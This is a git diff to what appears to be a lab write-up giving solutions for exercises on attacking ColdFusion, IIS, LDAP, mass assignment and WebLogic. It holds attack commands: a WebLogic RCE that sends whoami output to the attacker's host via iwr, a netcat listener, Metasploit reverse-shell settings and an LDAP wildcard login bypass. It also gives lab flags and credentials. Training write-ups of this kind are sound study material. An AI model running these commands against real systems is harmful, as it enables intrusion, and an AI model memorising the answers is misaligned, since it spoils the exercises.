@@ -30,7 +30,15 @@
 7. [Thick Client Applications](#thick-client-applications-1)
     1. [Attacking Thick Client Applications](#attacking-thick-client-applications)
     2. [Exploiting Web Vulnerabilities in Thick-Client Applications](#exploiting-web-vulnerabilities-in-thick-client-applications)
-
+8. [Miscellaneous Applications](#miscellaneous-applications-1)
+    1. [ColdFusion - Discovery & Enumeration](#coldfusion---discovery--enumeration)
+    2. [Attacking ColdFusion](#attacking-coldfusion)
+    3. [IIS Tilde Enumeration](#iis-tilde-enumeration)
+    4. [Attacking LDAP](#ldap)
+    5. [Web Mass Assignment Vulnerabilities](#web-mass-assignment-vulnerabilities)
+    6. [Attacking Applications Connecting to Services](#attacking-applications-connecting-to-services)
+    7. [Other Notable Applications](#other-notable-applications)
+    
 ## Tools
 ### Application Discovery & Enumeration
 - Nmap
@@ -59,6 +67,8 @@
 - dnSpy
 - de4dot
 - x64dbg
+### Miscellaneous Applications
+- [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner/tree/master/release)
 
 ## Setting the Stage
 ### Application Discovery & Enumeration
@@ -1019,4 +1029,166 @@
 
         The answer is `172.28.0.3`.
 
+## Miscellaneous Applications
+### ColdFusion - Discovery & Enumeration
+#### Challenges
+1. What ColdFusion protocol runs on port 5500?
 
+    Based on the module, port 5500 is `Server Monitor` protocol.
+
+### Attacking ColdFusion
+#### Challenges
+1. What user is ColdFusion running as?
+
+    First, we need to enumerate the host to find coldFusion version. After doing some exploration, in the `/CFIDE/administrator/` endpoint, we will get the login page that also displayed the version of it. 
+
+    ![alt text](<Assets/Attacking ColdFusion - 1.png>)
+
+    Based on the output, it has version 8. We can use `searchsploit` to find the vuln of Adobe coldfusion 8.
+
+    ```bash
+    searchsploit Adobe Coldfusion 8   
+    ```
+    ![alt text](<Assets/Attacking ColdFusion - 2.png>)
+
+    We can see that it has **RCE** vuln.  We can use the script provided from searchsploit.
+
+    ```bash
+    searchsploit -m 50057
+    ```
+    Then, we need to edit the file to set the correct lhost and rhost. After that, we can run the script.
+
+    ![alt text](<Assets/Attacking ColdFusion - 3.png>)
+
+    The answer is `arctic\tolis`.
+
+### IIS Tilde Enumeration
+#### Challenges
+1. What is the full .aspx filename that Gobuster identified?
+
+    First, we will use [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner/tree/master/release) to confirm the availability of `TRANSF~1.ASP`. 
+    
+    ![alt text](<Assets/IIS Tilde Enumeration - 1.png>)
+
+    It confirmed. Now we use this command to find words that start with "transf" and cleans up the output format.
+
+    ```bash
+    egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+    ```
+    Then, we can use **ffuf** to brute force.
+
+    ```bash
+    ffuf -u http://10.129.204.166/FUZZ -w /tmp/list.txt -e .aspx,.asp
+    ```
+    ![alt text](<Assets/IIS Tilde Enumeration - 2.png>)
+
+    The answer is `transfer.aspx`.
+
+### LDAP
+#### Challenges
+1. After bypassing the login, what is the website "Powered by"?
+
+    We can simply solve this by visit the website. Then, input `*` for username and password.
+
+    ![alt text](<Assets/LDAP - 1.png>)
+
+    The answer is `w3.css`.
+
+### Web Mass Assignment Vulnerabilities
+#### Challenges
+1. We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application.
+
+    Look at this lines.
+
+    ```python
+    try:
+		if request.form['active']:
+			cond=True
+	except:
+			cond=False
+	with sqlite3.connect("database.db") as con:
+		cur = con.cursor()
+		cur.execute('select * from users where username=?',(username,))
+		if cur.fetchone():
+			return render_template('index.html',value='User exists!!')
+		else:
+			cur.execute('insert into users values(?,?,?)',(username,password,cond))
+			con.commit()
+			return render_template('index.html',value='Success!!')
+    ```
+
+    The code explicitly checks for a POST parameter named active. If it exists, it sets cond (condition/approval) to True. Normally, the HTML form probably doesn't have an input named active, so cond defaults to False. In the /login route, the code checks if k: (where k is this condition). If it's false, you get "Account is pending for approval". The answer is `active`.
+
+### Attacking Applications Connecting to Services
+#### Challenges
+1. What credentials were found for the local database instance while debugging the octopus_checker binary? (Format username:password)
+
+    We can solve this by using **gdb-peda**.
+
+    ```bash
+    gdb ./octopus_checker
+    gdb-peda$ info functions
+    gdb-peda$ disas main
+    ```
+    ![alt text](<Assets/Attacking Applications Connecting to Services - 1.png>)
+
+    We can see that it call `SQLDriverConnect@plt` at `main+433`. We can set break point in here.
+
+    ```bash
+    gdb-peda$ b *main+433
+    gdb-peda$ r
+    ```
+    ![alt text](<Assets/Attacking Applications Connecting to Services - 2.png>)
+
+    The answer is `SA:N0tS3cr3t!`.
+
+### Other Notable Applications
+#### Challenges
+1. Enumerate the target host and identify the running application. What application is running?
+
+    First, we need to enumerate the target by using nmap.
+
+    ```bash
+    sudo nmap -A 10.129.242.43 -v
+    ```
+    ![alt text](<Assets/Other Notable Applications - 1.png>)
+
+    There are several open port results. The correct one is `WebLogic`.
+
+2. Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop.
+
+    We have found that the server run `WebLogic 12.2.1.3`. We can use `searchploit` to find the vuln.
+
+    ```bash
+    searchsploit WebLogic 12.2.1.3
+    ```
+    ![alt text](<Assets/Other Notable Applications - 2.png>)
+
+    We have found two script. I used 48971.py. To use this script we need to set target and command argument. We can test it like this:
+
+    ```bash
+    python3 48971.py http://10.129.242.43:7001 "powershell.exe -c \"\$o=(whoami); iwr http://10.10.14.131:7777/\$o\"
+    ```
+    But before run the script, we need to set the listener.
+
+    ```bash
+    sudo nc -lvnp 7777
+    ```
+    ![alt text](<Assets/Other Notable Applications - 3.png>)
+
+    We can see that we got `/nt%20authority/system` result beside GET output. But when i tried other command, i get nothing. So after doing some research, i found out that metasploit has module to [exploit](https://www.rapid7.com/db/modules/exploit/multi/http/weblogic_admin_handle_rce/) this vuln.
+
+    ```bash
+    [msf](Jobs:0 Agents:0) exploit(multi/http/weblogic_admin_handle_rce) >> set RHOSTS 10.129.242.43
+    RHOSTS => 10.129.242.43
+    [msf](Jobs:0 Agents:0) exploit(multi/http/weblogic_admin_handle_rce) >> set LHOST 10.10.14.131
+    LHOST => 10.10.14.131
+    [msf](Jobs:0 Agents:0) exploit(multi/http/weblogic_admin_handle_rce) >> set TARGET 4
+    TARGET => 4
+    [msf](Jobs:0 Agents:2) exploit(multi/http/weblogic_admin_handle_rce) >> set PAYLOAD windows/shell/reverse_tcp
+    PAYLOAD => windows/shell/reverse_tcp
+    [msf](Jobs:0 Agents:2) exploit(multi/http/weblogic_admin_handle_rce) >> exploit
+    ```
+    ![alt text](<Assets/Other Notable Applications - 4.png>)
+
+    We can see that we have succesfully get the flag. The answer is `w3b_l0gic_RCE!`.
